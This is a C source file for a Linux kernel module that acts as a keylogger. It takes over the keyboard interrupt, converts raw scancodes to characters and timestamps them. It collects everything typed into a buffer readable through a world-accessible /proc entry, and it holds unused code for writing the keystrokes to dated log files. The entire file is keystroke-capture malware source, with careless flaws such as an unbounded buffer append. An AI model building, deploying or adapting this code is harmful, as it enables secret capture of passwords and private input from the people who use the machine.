
#include <linux/kernel.h> /* We're doing kernel work */
#include <linux/module.h> /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h> /* We want an interrupt */
#include <asm/io.h>
#include <asm/irq_vectors.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/net.h>
#include <asm/current.h>
#include <asm/unistd.h>
#include <linux/proc_fs.h>    
#include <asm/uaccess.h>	/* for copy_from_user */
#include <linux/cdev.h>
#include <linux/string.h>

#define MAX_LEN 4096		
#define MY_WORK_QUEUE_NAME "WQsched"

char USER_NAME[7]="USRNAM\0";
char USER_TIME[11]="###:##:###";
char log_filename[11]="##_##_####";

static struct proc_dir_entry *proc_entry;

static char *info;

static struct workqueue_struct *my_workqueue;
//static char* scancode_ref = NULL;
unsigned long *syscall_table = (unsigned long *) 0xffffffff81801680;
void print_time(char []);
void write_file(char *,char *);

asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
asmlinkage int (*original_close)(unsigned int);
asmlinkage int (*original_open)(const char __user *, int, int);

/* Array that maps scancode to ascii character*/
unsigned char array1[128] =
{
    0,  27, '1', '2', '3', '4', '5', '6', '7', '8',	/* 9 */
  '9', '0', '-', '=', '\b',	/* Backspace */
  '\t',			/* Tab */
  'q', 'w', 'e', 'r',	/* 19 */
  't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',	/* Enter key */
    0,			/* 29   - Control */
  'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';',	/* 39 */
 '\'', '`',   0,		/* Left shift */
 '\\', 'z', 'x', 'c', 'v', 'b', 'n',			/* 49 */
  'm', ',', '.', '/',   0,				/* Right shift */
  '*',
    0,	/* Alt */
  ' ',	/* Space bar */
    0,	/* Caps lock */
    0,	/* 59 - F1 key ... > */
    0,   0,   0,   0,   0,   0,   0,   0,
    0,	/* < ... F10 */
    0,	/* 69 - Num lock*/
    0,	/* Scroll Lock */
    0,	/* Home key */
    0,	/* Up Arrow */
    0,	/* Page Up */
  '-',
    0,	/* Left Arrow */
    0,
    0,	/* Right Arrow */
  '+',
    0,	/* 79 - End key*/
    0,	/* Down Arrow */
    0,	/* Page Down */
    0,	/* Insert Key */
    0,	/* Delete Key */
    0,   0,   0,
    0,	/* F11 Key */
    0,	/* F12 Key */
    0,	/* All other keys are undefined */
};	

/* Array that maps scancode to ascii character when LShift or RShift is pressed*/
unsigned char shift_array1[128] =
{
    0,  27, '!', '@', '#', '$', '%', '^', '&', '*',	/* 9 */
  '(', ')', '_', '+', '\b',	/* Backspace */
  '\t',			/* Tab */
  'Q', 'W', 'E', 'R',	/* 19 */
  'T', 'Y', 'U', 'I', 'O', 'P', '{', '}', '\n',	/* Enter key */
    0,			/* 29   - Control */
  'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':',	/* 39 */
 '\"', '~',   0,		/* Left shift */
 '|', 'Z', 'X', 'C', 'V', 'B', 'N',			/* 49 */
  'M', '<', '>', '?',   0,				/* Right shift */
  '*',
    0,	/* Alt */
  ' ',	/* Space bar */
    0,	/* Caps lock */
    0,	/* 59 - F1 key ... > */
    0,   0,   0,   0,   0,   0,   0,   0,
    0,	/* < ... F10 */
    0,	/* 69 - Num lock*/
    0,	/* Scroll Lock */
    0,	/* Home key */
    0,	/* Up Arrow */
    0,	/* Page Up */
  '-',
    0,	/* Left Arrow */
    0,
    0,	/* Right Arrow */
  '+',
    0,	/* 79 - End key*/
    0,	/* Down Arrow */
    0,	/* Page Down */
    0,	/* Insert Key */
    0,	/* Delete Key */
    0,   0,   0,
    0,	/* F11 Key */
    0,	/* F12 Key */
    0,	/* All other keys are undefined */
};	 
/*
 * This will get called by the kernel as soon as it's safe
 * to do everything normally allowed by kernel modules.
*/

typedef struct {
  struct work_struct my_work;
  int    scancode;
} my_work_t;
my_work_t *work;

char char_buff[1000];

static void got_char(struct work_struct *work)
{
	my_work_t *work1 = (my_work_t *)work;
	
	char path[120],character[5];
	//char scancode = scancode_ref ? *scancode_ref : 0;
	int arr_index;
	static int check = 0, shift_key = 1;

	check++;	
	arr_index  = work1->scancode;		
	print_time(USER_TIME);                                    
	strcpy(path,"/home/bhargi/output/file/");
	strcat(path,log_filename);

	if (check == 1){		
		write_file(USER_TIME+1,path); 	//First entry of Timestamp in the file
	}

	printk(KERN_INFO "Scan Code %x %s.\n",
    	(work1->scancode & 0x7F),
   	(work1->scancode & 0x80) ? "Released" : "Pressed");
        
	if(!(work1->scancode & 0x80)){		
		if ((arr_index == 42) || (arr_index == 54))	//When LShift and RShift is pressed
			shift_key = 2;	

		if(shift_key == 2){
			character[0]=shift_array1[arr_index];
			character[1]='\0';
			//write_file(character,path);	
			strcat(char_buff,character);
		}	
		else{
			character[0]=array1[arr_index];
			character[1]='\0';
			//write_file(character,path);
			strcat(char_buff,character);
		}	
		if(arr_index == 28){					//When pressed Enter
			print_time(USER_TIME);                         // Get Current Time
			//write_file(USER_TIME+1,path);
			strcat(char_buff,USER_TIME+1);			// Write Timestamp after every enter
		}
		if(arr_index == 14){
			character[0]='$';
			character[1]='\0';
			//write_file(character,path);
			strcat(char_buff,character);
		}
	}
	else{
		if ((arr_index == 170) || (arr_index == 182))	//When LShift and RShift is released
			shift_key = 1;	
	}

	kfree((void *) work);
	return;
         }
     
/*
* This function services keyboard interrupts. It reads the relevant
* information from the keyboard and then puts the non time critical
* part into the work queue. This will be run when the kernel considers it safe.
*/
irqreturn_t irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	printk(KERN_INFO"Inside handler\n");
         /*
         * This variables are static because they need to be
         * accessible (through pointers) to the bottom half routine.
         */
         static int initialised = 0;
         static unsigned char scancode;
         //static struct work_struct task;
         unsigned char status;
	 
     
             /*
         * Read keyboard status
         */
         status = inb(0x64);
         scancode = inb(0x60);
     
	 work = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);
	
         if (initialised == 0 || initialised == 1) 
	{
		printk(KERN_INFO"inside if\n");
		INIT_WORK((struct work_struct *) work, got_char);	
		printk(KERN_INFO"inside if after init\n");
		 work->scancode=scancode ;
	         initialised = 1;
         } 
	else 
	{
		printk(KERN_INFO"inside prepare\n");
		INIT_WORK((struct work_struct *)work, got_char);
		//PREPARE_WORK((struct work_struct *)work, got_char);
		printk(KERN_INFO"inside prepare after prepare\n");
		//INIT_WORK((struct work_struct *) work, got_char);         
		work->scancode=scancode;
	 }
     	queue_work(my_workqueue, (struct work_struct *)work);
     	return IRQ_HANDLED;
}

/* Function to print timestamp */
void print_time(char char_time[])
{
 struct timeval my_tv;
 int sec, hr, min, tmp1, tmp2;
 int days,years,days_past_currentyear;
 int i=0,month=0,date=0;
 unsigned long get_time;
 char_time[11]="#00:00:00#";
	do_gettimeofday(&my_tv);                    // Get System Time From Kernel Mode
	get_time = my_tv.tv_sec;                   // Fetch System time in Seconds
//    printk(KERN_ALERT "\n %ld",get_time);
	get_time = get_time + 43200;
	sec = get_time % 60;                       // Convert into Seconds
	tmp1 = get_time / 60;
	min = tmp1 % 60;                          // Convert into Minutes
	tmp2 = tmp1 / 60;
	hr = (tmp2+4) % 24;                      // Convert into Hours
	hr=hr+1;
	char_time[1]=(hr/10)+48;                // Convert into Char from Int
	char_time[2]=(hr%10)+48;
	char_time[4]=(min/10)+48;
	char_time[5]=(min%10)+48;
	char_time[7]=(sec/10)+48;
	char_time[8]=(sec%10)+48;
	char_time[10]='\0';
	/* calculating date from time in seconds */
	days = (tmp2+4)/24;
	days_past_currentyear = days % 365;
	years = days / 365;
	for(i=1970;i<=(1970+years);i++)
	{
		if ((i % 4) == 0)
			 days_past_currentyear--;
	}

	if((1970+years % 4) != 0)
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
			month=1; //JAN
			date = days_past_currentyear;
		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 59)
		{
			month = 2;
			date = days_past_currentyear - 31;
		}

		else if (days_past_currentyear >59 && days_past_currentyear <= 90)
		{
				month = 3;
				date = days_past_currentyear - 59;
		}
		else if (days_past_currentyear >90 && days_past_currentyear <= 120)
		{
				month = 4;
				date = days_past_currentyear - 90;
		}

		else if (days_past_currentyear >120 && days_past_currentyear <= 151)
		{
				month = 5;
				date = days_past_currentyear - 120;
		}
		else if (days_past_currentyear >151 && days_past_currentyear <= 181)
		{
			month = 6;
			date = days_past_currentyear - 151;
		}
		else if (days_past_currentyear >181 && days_past_currentyear <= 212)
		{
				month = 7;
				date = days_past_currentyear - 181;
		}
		else if (days_past_currentyear >212 && days_past_currentyear <= 243)
		{
				month = 8;
				date = days_past_currentyear - 212;
		}
		else if (days_past_currentyear >243 && days_past_currentyear <= 273)
		{
				month = 9;
				date = days_past_currentyear - 243;
		}
		else if (days_past_currentyear >273 && days_past_currentyear <= 304)
		{
				month = 10;
				date = days_past_currentyear - 273;
		}
		else if (days_past_currentyear >304 && days_past_currentyear <= 334)
		{
			month = 11;
			date = days_past_currentyear - 304;
		}
		else if (days_past_currentyear >334 && days_past_currentyear <= 365)
		{
				month = 12;
				date = days_past_currentyear - 334;
		}
	}
	// for leap years..
	else
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
				month=1; //JAN
				date = days_past_currentyear;
		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 60)
		{
				   month = 2;
				date = days_past_currentyear - 31;
		}
		else if (days_past_currentyear >60 && days_past_currentyear <= 91)
		{
				month = 3;
				date = days_past_currentyear - 60;
		}
		else if (days_past_currentyear >91 && days_past_currentyear <= 121)
		{
				month = 4;
				date = days_past_currentyear - 91;
		}
		else if (days_past_currentyear >121 && days_past_currentyear <= 152)
		{
				month = 5;
				date = days_past_currentyear - 121;
		}
		else if (days_past_currentyear >152 && days_past_currentyear <= 182)
		{
				month = 6;
				date = days_past_currentyear - 152;
		}
		else if (days_past_currentyear >182 && days_past_currentyear <= 213)
		{
				month = 7;
				date = days_past_currentyear - 182;
		}
		else if (days_past_currentyear >213 && days_past_currentyear <= 244)
		{
				month = 8;
				date = days_past_currentyear - 213;
		}
		else if (days_past_currentyear >244 && days_past_currentyear <= 274)
		{
				month = 9;
				date = days_past_currentyear - 244;
		}
		else if (days_past_currentyear >274 && days_past_currentyear <= 305)
		{
				month = 10;
				date = days_past_currentyear - 274;
		}
		else if (days_past_currentyear >305 && days_past_currentyear <= 335)
		{
				month = 11;
				date = days_past_currentyear - 305;
		}
		else if (days_past_currentyear >335 && days_past_currentyear <= 366)
		{
				month = 12;
				date = days_past_currentyear - 335;
		}
	}

   	log_filename[0]=(month/10)+48;                // Convert into Char from Int
	log_filename[1]=(month%10)+48;
	log_filename[3]=(date/10)+48;
	log_filename[4]=(date%10)+48;
	tmp1 = ((1970+years) % 10) + 48;
	log_filename[9]= tmp1;
	tmp1 = (1970+years)/ 10;
	tmp2 = tmp1 % 10;
	log_filename[8]= tmp2 + 48;
	tmp1 = tmp1 / 10;
	tmp2 = tmp1 % 10;
	log_filename[7]=tmp2 + 48;
	tmp1 = tmp1 / 10;
	log_filename[6]= tmp1+48;
	log_filename[10]='\0';
}

int show_info(struct seq_file *f, void *b)
{
	seq_printf(f, "%s", char_buff);
	return 0;
}

int open_info(struct inode *inode, struct file *file)
{
	return single_open(file,show_info,NULL);
}

struct file_operations proc_fops = {
.owner = THIS_MODULE,
.open = open_info,
.read = seq_read,
.llseek = seq_lseek,
.release = single_release,
};

void write_file(char *buffer,char *path)
{

	mm_segment_t old_fs;
	int fd;

	old_fs=get_fs();
	set_fs(KERNEL_DS);
	fd = original_open(path, O_WRONLY|O_CREAT|O_APPEND,0777);
	if(fd >= 0) 
	{
		original_write(fd,buffer,strlen(buffer));
		original_close(fd);              
	}
	else
	{
		printk(KERN_ALERT "\n Error occur while opening a file : %d, %s",fd,path);
	}
	set_fs(old_fs);

	return;

}

/*
 * Initialize the module - register the IRQ handler
 */
int init_module()
{
	printk(KERN_INFO "inside init\n");
    my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
         /*
         * Since the keyboard handler won't co-exist with another handler,
         * such as us, we have to disable it (free its IRQ) before we do
         * anything. Since we don't know where it is, there's no way to
         * reinstate it later - so the computer will have to be rebooted
         * when we're done.
         */

    info = (char *)vmalloc( MAX_LEN );
    memset( info, 0, MAX_LEN );
    proc_entry = proc_create("procEntry123", 0777, NULL, &proc_fops);

    if (proc_entry == NULL)
    {
		int ret = 0;       
		ret = -1;
        vfree(info);
		remove_proc_entry("procEntry123", proc_entry);  // for proc
        printk(KERN_INFO "procEntry123 could not be created\n");
		return -ENOMEM;
    }
    else
    {
        //write_index = 0;
        //read_index = 0;
        printk(KERN_INFO "procEntry123 created.\n");
    }

    original_write= (void *)syscall_table[__NR_write];
   	original_close=(void *)syscall_table[__NR_close];
   	original_open=(void *)syscall_table[__NR_open];
 
	free_irq(1, NULL);
     
    /*
     * Request IRQ 1, the keyboard IRQ, to go to our irq_handler.
     * SA_SHIRQ means we're willing to have othe handlers on this IRQ.
     * SA_INTERRUPT can be used to make the handler into a fast interrupt.
     */
    return request_irq(1, /* The number of the keyboard IRQ on PCs */
    irq_handler, /* our handler */
    IRQF_SHARED, "test_keyboard_irq_handler",
    (void *)(irq_handler));
}
/*
 * Cleanup
 */
void cleanup_module()
{
    /*
     * This is only here for completeness. It's totally irrelevant, since
     * we don't have a way to restore the normal keyboard interrupt so the
     * computer is completely useless and has to be rebooted.
     */
	remove_proc_entry("procEntry123", proc_entry);  // for proc
	printk(KERN_INFO "procEntry123 unloaded.\n");  // for proc
	vfree(info); // for proc
    free_irq(1, NULL);
}

/*
 * some work_queue related functions are just available to GPL licensed Modules
 */
MODULE_LICENSE("GPL");